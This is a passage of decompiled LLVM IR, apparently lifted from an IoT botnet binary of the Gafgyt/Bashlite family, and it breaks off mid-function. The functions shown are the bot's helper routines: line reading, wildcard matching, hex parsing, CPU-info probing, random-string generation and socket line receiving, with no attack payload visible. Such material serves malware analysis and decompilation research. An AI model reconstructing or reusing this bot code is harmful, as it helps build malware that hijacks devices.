  %v2_1000180c = add i32 %v3_10001808, %v1_100017fc
  %v2_10001814 = inttoptr i32 %v2_1000180c to i32*
  store i32 0, i32* %v2_10001814, align 4
  br i1 %v4_100017c8.lcssa, label %dec_label_pc_1000184c, label %dec_label_pc_10001828

dec_label_pc_10001828:                            ; preds = %dec_label_pc_100017e4
  %v3_10001828 = load i32, i32* %stack_var_-52, align 4
  %v1_10001834 = call i32 @__asm_rlwinm(i32 %v3_10001828, i32 0, i32 16, i32 23)
  %v4_10001838 = sdiv i32 %v1_10001834, 256
  br label %dec_label_pc_1000184c

dec_label_pc_1000184c:                            ; preds = %dec_label_pc_100017e4, %dec_label_pc_10001828
  %storemerge2 = phi i32 [ %v4_10001838, %dec_label_pc_10001828 ], [ -1, %dec_label_pc_100017e4 ]
  br label %dec_label_pc_10001854

dec_label_pc_10001854:                            ; preds = %dec_label_pc_10001720, %dec_label_pc_1000184c
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_1000184c ], [ -1, %dec_label_pc_10001720 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10001734, { 0, 2, 1, 4, 3, 6, 5, 7 }
  uselistorder i32 %v1_10001700, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001854, { 1, 0 }
  uselistorder label %dec_label_pc_1000184c, { 1, 0 }
  uselistorder label %dec_label_pc_100017e4, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_100018e8

dec_label_pc_100018a8:                            ; preds = %dec_label_pc_100018f8
  store i32 268441800, i32* @lr, align 4
  %v4_100018c4 = call i32 @__libc_read(i32 %arg3, i32 %v2_10001904, i32 1, i32 %storemerge25)
  %v1_100018d4 = add nuw i32 %storemerge25, 1
  %v3_100018e0 = icmp eq i32 %v4_100018c4, 1
  br i1 %v3_100018e0, label %dec_label_pc_100018e8, label %dec_label_pc_1000191c

dec_label_pc_100018e8:                            ; preds = %entry, %dec_label_pc_100018a8
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_100018d4, %dec_label_pc_100018a8 ]
  %v2_100018f0 = icmp slt i32 %storemerge25, %arg2
  br i1 %v2_100018f0, label %dec_label_pc_100018f8, label %dec_label_pc_1000191c

dec_label_pc_100018f8:                            ; preds = %dec_label_pc_100018e8
  %v2_10001904 = add i32 %storemerge25, %arg1
  %v1_10001908 = add i32 %v2_10001904, -1
  %v1_1000190c = inttoptr i32 %v1_10001908 to i8*
  %v2_1000190c = load i8, i8* %v1_1000190c, align 1
  %v3_10001914 = icmp eq i8 %v2_1000190c, 10
  br i1 %v3_10001914, label %dec_label_pc_1000191c, label %dec_label_pc_100018a8

dec_label_pc_1000191c:                            ; preds = %dec_label_pc_100018f8, %dec_label_pc_100018e8, %dec_label_pc_100018a8
  %stack_var_-36.0.lcssa = phi i32 [ 1, %dec_label_pc_100018f8 ], [ 1, %dec_label_pc_100018e8 ], [ %v4_100018c4, %dec_label_pc_100018a8 ]
  %v3_10001920 = icmp eq i32 %stack_var_-36.0.lcssa, 0
  %storemerge = select i1 %v3_10001920, i32 0, i32 %arg1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10001904, { 1, 0 }
  uselistorder i32 %v4_100018c4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100018e8, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100019b83 = load i8, i8* %arg1, align 1
  %v3_100019c06 = icmp eq i8 %v2_100019b83, 0
  br i1 %v3_100019c06, label %dec_label_pc_100019d4, label %dec_label_pc_100019c8

dec_label_pc_10001978:                            ; preds = %dec_label_pc_100019c8
  %v1_1000197c = mul i32 %stack_var_-40.07, 16
  %v2_10001984 = load i8, i8* %stack_var_-24.08, align 1
  %v3_10001984 = zext i8 %v2_10001984 to i32
  %v1_10001994 = mul nuw nsw i32 %v3_10001984, 4
  %v2_10001998 = add i32 %v1_10001994, ptrtoint (i32* @global_var_1000de60.31 to i32)
  %v1_1000199c = inttoptr i32 %v2_10001998 to i32*
  %v2_1000199c = load i32, i32* %v1_1000199c, align 4
  %v2_100019a0 = or i32 %v2_1000199c, %v1_1000197c
  %v1_100019ac = add i32 %v4_100019b49, 1
  %v5_100019b0 = inttoptr i32 %v1_100019ac to i8*
  %v2_100019b8 = load i8, i8* %v5_100019b0, align 1
  %v3_100019c0 = icmp eq i8 %v2_100019b8, 0
  br i1 %v3_100019c0, label %dec_label_pc_100019d4, label %dec_label_pc_100019c8

dec_label_pc_100019c8:                            ; preds = %entry, %dec_label_pc_10001978
  %v4_100019b49 = phi i32 [ %v1_100019ac, %dec_label_pc_10001978 ], [ %tmp, %entry ]
  %stack_var_-24.08 = phi i8* [ %v5_100019b0, %dec_label_pc_10001978 ], [ %arg1, %entry ]
  %stack_var_-40.07 = phi i32 [ %v2_100019a0, %dec_label_pc_10001978 ], [ 0, %entry ]
  %tmp17 = icmp sgt i32 %stack_var_-40.07, -1
  br i1 %tmp17, label %dec_label_pc_10001978, label %dec_label_pc_100019d4

dec_label_pc_100019d4:                            ; preds = %dec_label_pc_10001978, %dec_label_pc_100019c8, %entry
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v2_100019a0, %dec_label_pc_10001978 ], [ %stack_var_-40.07, %dec_label_pc_100019c8 ]
  ret i32 %stack_var_-40.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-40.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100019d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100019c8, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %v2_10001a10 = load i8, i8* %arg1, align 1
  %v3_10001a20 = icmp eq i8 %v2_10001a10, 42
  br i1 %v3_10001a20, label %dec_label_pc_10001a58, label %dec_label_pc_10001a28

dec_label_pc_10001a28:                            ; preds = %entry
  %v3_10001a2c = icmp eq i8 %v2_10001a10, 63
  br i1 %v3_10001a2c, label %dec_label_pc_10001acc, label %dec_label_pc_10001a34

dec_label_pc_10001a34:                            ; preds = %dec_label_pc_10001a28
  %v3_10001a38 = icmp eq i8 %v2_10001a10, 0
  br i1 %v3_10001a38, label %dec_label_pc_10001a44, label %dec_label_pc_10001b28

dec_label_pc_10001a44:                            ; preds = %dec_label_pc_10001a34
  %v2_10001a48 = load i8, i8* %tmp, align 1
  %v3_10001a48 = zext i8 %v2_10001a48 to i32
  br label %dec_label_pc_10001bac

dec_label_pc_10001a58:                            ; preds = %entry
  %v2_10001a5c = add i32 %tmp9, 1
  store i32 268442220, i32* @lr, align 4
  %v5_10001a68 = inttoptr i32 %v2_10001a5c to i8*
  %v6_10001a68 = call i32 @wildString(i8* %v5_10001a68, i32 %arg2, i32 %tmp9)
  %v3_10001a70 = icmp eq i32 %v6_10001a68, 0
  br i1 %v3_10001a70, label %dec_label_pc_10001ab8, label %dec_label_pc_10001a78

dec_label_pc_10001a78:                            ; preds = %dec_label_pc_10001a58
  %v2_10001a7c = load i8, i8* %tmp, align 1
  %v3_10001a84 = icmp eq i8 %v2_10001a7c, 0
  br i1 %v3_10001a84, label %dec_label_pc_10001ac0, label %dec_label_pc_10001a8c

dec_label_pc_10001a8c:                            ; preds = %dec_label_pc_10001a78
  %v2_10001a90 = add i32 %arg2, 1
  store i32 268442272, i32* @lr, align 4
  %v6_10001a9c = call i32 @wildString(i8* nonnull %arg1, i32 %v2_10001a90, i32 %arg2)
  %v3_10001aa4 = icmp eq i32 %v6_10001a9c, 0
  br i1 %v3_10001aa4, label %dec_label_pc_10001ab8, label %dec_label_pc_10001ac0

dec_label_pc_10001ab8:                            ; preds = %dec_label_pc_10001a8c, %dec_label_pc_10001a58
  br label %dec_label_pc_10001ac0

dec_label_pc_10001ac0:                            ; preds = %dec_label_pc_10001a78, %dec_label_pc_10001a8c, %dec_label_pc_10001ab8
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10001ab8 ], [ 1, %dec_label_pc_10001a8c ], [ 1, %dec_label_pc_10001a78 ]
  br label %dec_label_pc_10001bac

dec_label_pc_10001acc:                            ; preds = %dec_label_pc_10001a28
  %v2_10001ad0 = load i8, i8* %tmp, align 1
  %v3_10001ad8 = icmp eq i8 %v2_10001ad0, 0
  br i1 %v3_10001ad8, label %dec_label_pc_10001b1c, label %dec_label_pc_10001ae0

dec_label_pc_10001ae0:                            ; preds = %dec_label_pc_10001acc
  %v1_10001ae4 = add i32 %tmp9, 1
  %v2_10001aec = add i32 %arg2, 1
  store i32 268442364, i32* @lr, align 4
  %v4_10001af8 = inttoptr i32 %v1_10001ae4 to i8*
  %v5_10001af8 = call i32 @wildString(i8* %v4_10001af8, i32 %v2_10001aec, i32 %arg2)
  %v3_10001b00 = icmp ne i32 %v5_10001af8, 0
  %. = zext i1 %v3_10001b00 to i32
  br label %dec_label_pc_10001b1c

dec_label_pc_10001b1c:                            ; preds = %dec_label_pc_10001ae0, %dec_label_pc_10001acc
  %storemerge3 = phi i32 [ 1, %dec_label_pc_10001acc ], [ %., %dec_label_pc_10001ae0 ]
  br label %dec_label_pc_10001bac

dec_label_pc_10001b28:                            ; preds = %dec_label_pc_10001a34
  %v3_10001b2c = load i8, i8* %arg1, align 1
  %v4_10001b2c = zext i8 %v3_10001b2c to i32
  store i32 268442432, i32* @lr, align 4
  %v3_10001b3c = call i32 @__GI_toupper(i32 %v4_10001b2c, i32 %tmp9)
  %v3_10001b48 = load i8, i8* %tmp, align 1
  %v4_10001b48 = zext i8 %v3_10001b48 to i32
  store i32 268442460, i32* @lr, align 4
  %v3_10001b58 = call i32 @__GI_toupper(i32 %v4_10001b48, i32 %arg2)
  %v4_10001b60 = icmp eq i32 %v3_10001b3c, %v3_10001b58
  br i1 %v4_10001b60, label %dec_label_pc_10001b68, label %dec_label_pc_10001ba4

dec_label_pc_10001b68:                            ; preds = %dec_label_pc_10001b28
  %v1_10001b6c = add i32 %tmp9, 1
  %v2_10001b74 = add i32 %arg2, 1
  store i32 268442500, i32* @lr, align 4
  %v4_10001b80 = inttoptr i32 %v1_10001b6c to i8*
  %v5_10001b80 = call i32 @wildString(i8* %v4_10001b80, i32 %v2_10001b74, i32 %arg2)
  %v3_10001b88 = icmp ne i32 %v5_10001b80, 0
  %.8 = zext i1 %v3_10001b88 to i32
  br label %dec_label_pc_10001ba4

dec_label_pc_10001ba4:                            ; preds = %dec_label_pc_10001b68, %dec_label_pc_10001b28
  %storemerge = phi i32 [ 1, %dec_label_pc_10001b28 ], [ %.8, %dec_label_pc_10001b68 ]
  br label %dec_label_pc_10001bac

dec_label_pc_10001bac:                            ; preds = %dec_label_pc_10001b1c, %dec_label_pc_10001ac0, %dec_label_pc_10001a44, %dec_label_pc_10001ba4
  %stack_var_-36.0 = phi i32 [ %storemerge4, %dec_label_pc_10001ac0 ], [ %storemerge3, %dec_label_pc_10001b1c ], [ %v3_10001a48, %dec_label_pc_10001a44 ], [ %storemerge, %dec_label_pc_10001ba4 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_10001bac, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001ac0, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268442616, i32* @lr, align 4
  %v1_10001bf4 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_10001bf4, i32* %arg2, align 4
  %v4_10001c10 = icmp eq i32 %v1_10001bf4, -1
  %. = zext i1 %v4_10001c10 to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10001ca02 = load i8, i8* %arg1, align 1
  %v3_10001ca85 = icmp eq i8 %v2_10001ca02, 0
  br i1 %v3_10001ca85, label %dec_label_pc_10001cb0, label %dec_label_pc_10001c68

dec_label_pc_10001c68:                            ; preds = %entry, %dec_label_pc_10001c68
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_10001c68 ], [ %arg1, %entry ]
  %storemerge.in6 = phi i32 [ %v1_10001c94, %dec_label_pc_10001c68 ], [ %tmp, %entry ]
  %v3_10001c6c = load i8, i8* %storemerge7, align 1
  %v4_10001c6c = zext i8 %v3_10001c6c to i32
  store i32 %v4_10001c6c, i32* %r3.global-to-local, align 4
  store i32 268442752, i32* @lr, align 4
  %v3_10001c7c = call i32 @__GI_toupper(i32 %v4_10001c6c, i32 %storemerge.in6)
  store i32 %v3_10001c7c, i32* %r3.global-to-local, align 4
  %v1_10001c8c = trunc i32 %v3_10001c7c to i8
  store i8 %v1_10001c8c, i8* %storemerge7, align 1
  %v1_10001c94 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_10001c94 to i8*
  %v2_10001ca0 = load i8, i8* %storemerge, align 1
  %v3_10001ca8 = icmp eq i8 %v2_10001ca0, 0
  br i1 %v3_10001ca8, label %dec_label_pc_10001c9c.dec_label_pc_10001cb0_crit_edge, label %dec_label_pc_10001c68

dec_label_pc_10001c9c.dec_label_pc_10001cb0_crit_edge: ; preds = %dec_label_pc_10001c68
  %v0_10001cc4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001cb0

dec_label_pc_10001cb0:                            ; preds = %dec_label_pc_10001c9c.dec_label_pc_10001cb0_crit_edge, %entry
  %v0_10001cc4 = phi i32 [ %v0_10001cc4.pre, %dec_label_pc_10001c9c.dec_label_pc_10001cb0_crit_edge ], [ %tmp, %entry ]
  ret i32 %v0_10001cc4

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_10001c94, { 1, 0 }
  uselistorder i32 %storemerge.in6, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10001c68, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 268442868, i32* @lr, align 4
  %v3_10001cf0 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_1000e260.32 to i32), i32 0)
  %v2_10001e90 = ptrtoint i32* %stack_var_-4128 to i32
  %v1_10001d08 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_10001e90

dec_label_pc_10001d00:                            ; preds = %dec_label_pc_10001e90
  store i32 268442892, i32* @lr, align 4
  %v2_10001d08 = call i32 @uppercase(i8* %v1_10001d08)
  store i32 268442912, i32* @lr, align 4
  %v5_10001d1c = call i32 @strstr(i32 %v2_10001e90, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000e270.33, i32 0, i32 0), i32 268500992)
  %v4_10001d2c = icmp eq i32 %v5_10001d1c, %v2_10001e90
  br i1 %v4_10001d2c, label %dec_label_pc_10001d34, label %dec_label_pc_10001e78

dec_label_pc_10001d34:                            ; preds = %dec_label_pc_10001d00
  %tmp15 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_10001d50

dec_label_pc_10001d44:                            ; preds = %dec_label_pc_10001d78, %dec_label_pc_10001d64, %dec_label_pc_10001d50
  %v1_10001d48 = add i32 %v4_10001d50, 1
  %v5_10001d4c = inttoptr i32 %v1_10001d48 to i8*
  br label %dec_label_pc_10001d50

dec_label_pc_10001d50:                            ; preds = %dec_label_pc_10001d34, %dec_label_pc_10001d44
  %storemerge2 = phi i8* [ %v5_10001d4c, %dec_label_pc_10001d44 ], [ %tmp15, %dec_label_pc_10001d34 ]
  %v4_10001d50 = ptrtoint i8* %storemerge2 to i32
  %v2_10001d54 = load i8, i8* %storemerge2, align 1
  %v3_10001d5c = icmp eq i8 %v2_10001d54, 32
  br i1 %v3_10001d5c, label %dec_label_pc_10001d44, label %dec_label_pc_10001d64

dec_label_pc_10001d64:                            ; preds = %dec_label_pc_10001d50
  %v2_10001d68 = load i8, i8* %storemerge2, align 1
  %v3_10001d70 = icmp eq i8 %v2_10001d68, 9
  br i1 %v3_10001d70, label %dec_label_pc_10001d44, label %dec_label_pc_10001d78

dec_label_pc_10001d78:                            ; preds = %dec_label_pc_10001d64
  %v2_10001d7c = load i8, i8* %storemerge2, align 1
  %v3_10001d84 = icmp eq i8 %v2_10001d7c, 58
  br i1 %v3_10001d84, label %dec_label_pc_10001d44, label %dec_label_pc_10001db8.preheader

dec_label_pc_10001db8.preheader:                  ; preds = %dec_label_pc_10001d78
  %v2_10001dd0 = add i32 %v4_10001d50, -1
  br label %dec_label_pc_10001db8

dec_label_pc_10001d90:                            ; preds = %dec_label_pc_10001de8, %dec_label_pc_10001db8
  store i32 %v4_10001d50, i32* @r3, align 4
  %v0_10001d98 = call i32 @__GI_strlen()
  %v1_10001dac = add i32 %v0_10001d98, %v2_10001dd0
  %v3_10001db4 = inttoptr i32 %v1_10001dac to i8*
  store i8 0, i8* %v3_10001db4, align 1
  br label %dec_label_pc_10001db8

dec_label_pc_10001db8:                            ; preds = %dec_label_pc_10001db8.preheader, %dec_label_pc_10001d90
  store i32 %v4_10001d50, i32* @r3, align 4
  %v0_10001dc0 = call i32 @__GI_strlen()
  %v1_10001dd4 = add i32 %v0_10001dc0, %v2_10001dd0
  %v1_10001dd8 = inttoptr i32 %v1_10001dd4 to i8*
  %v2_10001dd8 = load i8, i8* %v1_10001dd8, align 1
  %v3_10001de0 = icmp eq i8 %v2_10001dd8, 13
  br i1 %v3_10001de0, label %dec_label_pc_10001d90, label %dec_label_pc_10001de8

dec_label_pc_10001de8:                            ; preds = %dec_label_pc_10001db8
  store i32 %v4_10001d50, i32* @r3, align 4
  %v0_10001df0 = call i32 @__GI_strlen()
  %v1_10001e04 = add i32 %v0_10001df0, %v2_10001dd0
  %v1_10001e08 = inttoptr i32 %v1_10001e04 to i8*
  %v2_10001e08 = load i8, i8* %v1_10001e08, align 1
  %v3_10001e10 = icmp eq i8 %v2_10001e08, 10
  br i1 %v3_10001e10, label %dec_label_pc_10001d90, label %dec_label_pc_10001e18

dec_label_pc_10001e18:                            ; preds = %dec_label_pc_10001de8
  store i32 %v4_10001d50, i32* @r3, align 4
  store i32 268443176, i32* @lr, align 4
  %v2_10001e24 = call i32 @__GI_strchr(i32 %v4_10001d50, i32 46)
  %v3_10001e2c = icmp eq i32 %v2_10001e24, 0
  br i1 %v3_10001e2c, label %dec_label_pc_10001e50, label %dec_label_pc_10001e34

dec_label_pc_10001e34:                            ; preds = %dec_label_pc_10001e18
  store i32 %v4_10001d50, i32* @r3, align 4
  store i32 268443204, i32* @lr, align 4
  %v2_10001e40 = call i32 @__GI_strchr(i32 %v4_10001d50, i32 46)
  %v3_10001e4c = inttoptr i32 %v2_10001e40 to i8*
  store i8 0, i8* %v3_10001e4c, align 1
  br label %dec_label_pc_10001e50

dec_label_pc_10001e50:                            ; preds = %dec_label_pc_10001e18, %dec_label_pc_10001e34
  %v3_10001e60 = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  store i32 ptrtoint (i32* @global_var_10001e6c.34 to i32), i32* @lr, align 4
  %v1_10001e68 = call i32 @__libc_close(i32 %v3_10001cf0)
  br label %dec_label_pc_10001ec0

dec_label_pc_10001e78:                            ; preds = %dec_label_pc_10001d00
  store i32 268443280, i32* @lr, align 4
  %v3_10001e8c = call i32 @__GI_memset(i32 %v2_10001e90, i32 0, i32 4096)
  br label %dec_label_pc_10001e90

dec_label_pc_10001e90:                            ; preds = %entry, %dec_label_pc_10001e78
  %v3_10001ea0 = call i32 @fdgets(i32 %v2_10001e90, i32 4096, i32 %v3_10001cf0)
  %v3_10001ea8 = icmp eq i32 %v3_10001ea0, 0
  br i1 %v3_10001ea8, label %dec_label_pc_10001eb0, label %dec_label_pc_10001d00

dec_label_pc_10001eb0:                            ; preds = %dec_label_pc_10001e90
  store i32 ptrtoint (i32* @global_var_10001eb8.35 to i32), i32* @lr, align 4
  %v1_10001eb4 = call i32 @__libc_close(i32 %v3_10001cf0)
  br label %dec_label_pc_10001ec0

dec_label_pc_10001ec0:                            ; preds = %dec_label_pc_10001e50, %dec_label_pc_10001eb0
  %storemerge = phi i32 [ 1, %dec_label_pc_10001eb0 ], [ 0, %dec_label_pc_10001e50 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_10001d50, { 1, 0, 3, 2, 4, 7, 5, 6, 8 }
  uselistorder i8* %storemerge2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_10001e90, { 3, 0, 1, 2 }
  uselistorder i32 %v3_10001cf0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10001e90, { 1, 0 }
  uselistorder label %dec_label_pc_10001e50, { 1, 0 }
  uselistorder label %dec_label_pc_10001db8, { 1, 0 }
  uselistorder label %dec_label_pc_10001d50, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4112 = alloca i32, align 4
  store i32 268443408, i32* @lr, align 4
  %v3_10001f0c = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_1000e260.32 to i32), i32 0)
  %v2_10001f70 = ptrtoint i32* %stack_var_-4112 to i32
  %v1_10001f24 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_10001f70

dec_label_pc_10001f1c:                            ; preds = %dec_label_pc_10001f70
  store i32 268443432, i32* @lr, align 4
  %v2_10001f24 = call i32 @uppercase(i8* %v1_10001f24)
  store i32 268443452, i32* @lr, align 4
  %v5_10001f38 = call i32 @strstr(i32 %v2_10001f70, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000e270.33, i32 0, i32 0), i32 268500992)
  %v4_10001f44 = icmp eq i32 %v5_10001f38, %v2_10001f70
  br i1 %v4_10001f44, label %dec_label_pc_10001f4c, label %dec_label_pc_10001f58

dec_label_pc_10001f4c:                            ; preds = %dec_label_pc_10001f1c
  %v1_10001f50 = add i32 %stack_var_-4116.1, 1
  br label %dec_label_pc_10001f58

dec_label_pc_10001f58:                            ; preds = %dec_label_pc_10001f1c, %dec_label_pc_10001f4c
  %stack_var_-4116.0 = phi i32 [ %v1_10001f50, %dec_label_pc_10001f4c ], [ %stack_var_-4116.1, %dec_label_pc_10001f1c ]
  store i32 268443504, i32* @lr, align 4
  %v3_10001f6c = call i32 @__GI_memset(i32 %v2_10001f70, i32 0, i32 4096)
  br label %dec_label_pc_10001f70

dec_label_pc_10001f70:                            ; preds = %entry, %dec_label_pc_10001f58
  %stack_var_-4116.1 = phi i32 [ 0, %entry ], [ %stack_var_-4116.0, %dec_label_pc_10001f58 ]
  %v3_10001f80 = call i32 @fdgets(i32 %v2_10001f70, i32 4096, i32 %v3_10001f0c)
  %v3_10001f88 = icmp eq i32 %v3_10001f80, 0
  br i1 %v3_10001f88, label %dec_label_pc_10001f90, label %dec_label_pc_10001f1c

dec_label_pc_10001f90:                            ; preds = %dec_label_pc_10001f70
  store i32 268443544, i32* @lr, align 4
  %v1_10001f94 = call i32 @__libc_close(i32 %v3_10001f0c)
  ret i32 %stack_var_-4116.1

; uselistorder directives
  uselistorder i32 %stack_var_-4116.1, { 0, 2, 1 }
  uselistorder i32 %v2_10001f70, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001f70, { 1, 0 }
  uselistorder label %dec_label_pc_10001f58, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001fd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_100020504 = icmp sgt i32 %arg2, 0
  br i1 %v2_100020504, label %dec_label_pc_10001fec, label %dec_label_pc_10002058

dec_label_pc_10001fec:                            ; preds = %entry, %dec_label_pc_10001fec
  %storemerge37 = phi i32 [ %v1_10002040, %dec_label_pc_10001fec ], [ 0, %entry ]
  %v2_10001ff8 = add i32 %storemerge37, %v0_10001fd0
  %v0_10001ffc = call i32 @rand_cmwc()
  store i32 %v0_10001ffc, i32* %r3.global-to-local, align 4
  %v1_10002010 = urem i32 %v0_10001ffc, 26
  %fold = add nuw nsw i32 %v1_10002010, 65
  %v1_10002038 = trunc i32 %fold to i8
  %v3_10002038 = inttoptr i32 %v2_10001ff8 to i8*
  store i8 %v1_10002038, i8* %v3_10002038, align 1
  %v1_10002040 = add nuw nsw i32 %storemerge37, 1
  %v2_10002050 = icmp slt i32 %v1_10002040, %arg2
  br i1 %v2_10002050, label %dec_label_pc_10001fec, label %dec_label_pc_10002048.dec_label_pc_10002058_crit_edge

dec_label_pc_10002048.dec_label_pc_10002058_crit_edge: ; preds = %dec_label_pc_10001fec
  %v0_10002070.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002058

dec_label_pc_10002058:                            ; preds = %dec_label_pc_10002048.dec_label_pc_10002058_crit_edge, %entry
  %v0_10002070 = phi i32 [ %v0_10002070.pre, %dec_label_pc_10002048.dec_label_pc_10002058_crit_edge ], [ %v0_10001fd0, %entry ]
  ret i32 %v0_10002070

; uselistorder directives
  uselistorder i32 %v1_10002040, { 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v0_10001fd0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10001fec, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100020ac.36 to i32), i32* @lr, align 4
  %v4_100020a8 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-40, align 4
  %v2_100020bc = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_100020d0

dec_label_pc_100020d0:                            ; preds = %entry, %dec_label_pc_100020d0
  %storemerge618 = phi i32 [ 0, %entry ], [ %v1_100020ec, %dec_label_pc_100020d0 ]
  %v1_100020d8 = mul nuw nsw i32 %storemerge618, 4
  %v2_100020dc = add i32 %v1_100020d8, %v2_100020bc
  %v2_100020e4 = inttoptr i32 %v2_100020dc to i32*
  store i32 0, i32* %v2_100020e4, align 4
  %v1_100020ec = add nuw nsw i32 %storemerge618, 1
  %tmp42 = icmp ult i32 %v1_100020ec, 32
  br i1 %tmp42, label %dec_label_pc_100020d0, label %dec_label_pc_10002100

dec_label_pc_10002100:                            ; preds = %dec_label_pc_100020d0
  %v1_10002104 = udiv i32 %arg1, 32
  %v1_1000210c = mul nuw nsw i32 %v1_10002104, 4
  %v2_10002110 = ptrtoint i32* %stack_var_-200 to i32
  %v2_10002114 = add nuw nsw i32 %v1_1000210c, 32
  %v1_10002118 = add i32 %v2_10002114, %v2_10002110
  %v1_1000211c = inttoptr i32 %v1_10002118 to i32*
  %v2_1000211c = load i32, i32* %v1_1000211c, align 4
  %v1_10002124 = urem i32 %arg1, 32
  %v3_1000212c = shl i32 1, %v1_10002124
  %v2_10002130 = or i32 %v2_1000211c, %v3_1000212c
  store i32 %v2_10002130, i32* %v1_1000211c, align 4
  %v1_1000214c = add i32 %arg1, 1
  %v2_10002158 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268444020, i32* @lr, align 4
  %v5_10002170 = call i32 @__libc_select(i32 %v1_1000214c, i32 %v2_100020bc, i32 0, i32 %v2_100020bc, i32 %v2_10002158)
  %v2_10002180 = icmp sgt i32 %v5_10002170, 0
  br i1 %v2_10002180, label %dec_label_pc_1000232c.preheader, label %dec_label_pc_10002290.preheader

dec_label_pc_10002290.preheader:                  ; preds = %dec_label_pc_10002100
  %tmp43 = icmp slt i32 %tmp25, 10
  br i1 %tmp43, label %dec_label_pc_1000218c, label %dec_label_pc_1000232c.preheader

dec_label_pc_1000218c:                            ; preds = %dec_label_pc_10002290.preheader, %dec_label_pc_10002284
  %stack_var_-176.017 = phi i32 [ %v1_10002288, %dec_label_pc_10002284 ], [ %tmp25, %dec_label_pc_10002290.preheader ]
  %v3_10002190 = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint (i32* @global_var_100021a8.39 to i32), i32* @lr, align 4
  %v4_100021a4 = call i32 @sockprintf(i32 %v3_10002190, i32 ptrtoint ([5 x i8]* @global_var_1000e27c.38 to i32), i32 268500992)
  store i32 30, i32* %stack_var_-40, align 4
  store i32 %v2_100020bc, i32* %stack_var_-200, align 4
  store i32 0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_100021cc.dec_label_pc_100021cc_crit_edge

